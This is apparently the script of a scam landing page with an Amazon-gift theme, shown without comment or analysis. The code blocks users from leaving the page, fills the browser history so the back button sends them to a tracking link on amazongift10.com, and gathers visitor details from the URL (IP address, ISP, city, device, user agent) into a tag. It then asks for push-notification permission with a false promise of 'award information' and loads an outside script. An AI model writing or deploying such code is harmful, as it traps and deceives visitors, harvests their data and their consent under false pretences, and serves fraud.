function getURLParameter(name) {
    return decodeURI(
        (RegExp(name + '=' + '(.*?)(&|$)').exec(location.search) || [, null])[1] || ''
    );
}

var PreventExitPop = true;
function ExitPop() {
if(PreventExitPop != false) {
return "";
}
}
window.onbeforeunload = ExitPop; 

! function() {
var t;
try {
for(t = 0; 10 > t; ++t) history.pushState({}, "", "");
onpopstate = function(t) {
PreventExitPop = false
t.state && location.replace("https://t.amazongift10.com/click.php?key=96diy7xolk39ey4ks4mz")
}
} catch(o) {}
}();

// COLLECT PUSH
var userJson = JSON.stringify({
            device_name: getURLParameter('device_name'),
            browser_name: getURLParameter('browser_name'),
            language: getURLParameter('language'),
            city: getURLParameter('city'),
            trafficsource_name: getURLParameter('trafficsource_name'),
            device_brand: getURLParameter('device_brand'),
            device_model: getURLParameter('device_model'),
            browser_version: getURLParameter('browser_version'),
            os_name: getURLParameter('os_name'),
            os_version: getURLParameter('os_version'),
            country: getURLParameter('country'),
            isp: getURLParameter('isp'),
            ip: getURLParameter('ip'),
            user_agent: getURLParameter('user_agent'),
            clickid: getURLParameter('clickid'),
			intent: getURLParameter('intent')
        })

//var pm_allowAction = function () { location.href = ''; };
//var pm_denyAction = function () { location.href = ''; };
var pm_tag = userJson;
//var pm_enablePrompt = true;
var pm_promptText = 'Please allow us to push you the award information.Thank you!';
var pm_promptAcceptBtnText = 'OK';
var pm_promptDenyBtnText = 'NO';
//var pm_promptHideDeny = true;
var pm_pid = "888888888";

var imported = document.createElement('script');
imported.src = './pub.min.js';
document.head.appendChild(imported);

